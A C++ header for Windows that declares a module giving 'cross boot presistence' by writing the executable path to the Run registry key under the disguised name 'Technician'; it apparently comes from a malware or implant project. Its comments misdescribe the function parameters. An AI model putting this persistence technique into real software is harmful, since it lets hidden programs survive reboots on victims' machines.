#pragma once

#include <windows.h>
#include <string>
#include <iostream>

#include "Exception.h"

#define RUN_KEY  "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define KEY_NAME  "Technician"

/*
* Presisence exception class
*/
class PresistenceException : public Exception{
  public:
    PresistenceException(int status, std::string funcName);
};

/*
* Gets the current process exe path 
* 
* @param path: path to the exectuable [IN/OUT]
* @param size: length of the path [IN/OUT]
*
*/
std::string getProcessExe();

/*
* Provide cross boot presistence using the RUN Registry key
* 
* @param path: path to the exectuable [IN]
* @param pathLength: length of the path [IN]
*
* @return exit status
*/
void RegistryLogon(std::string path);
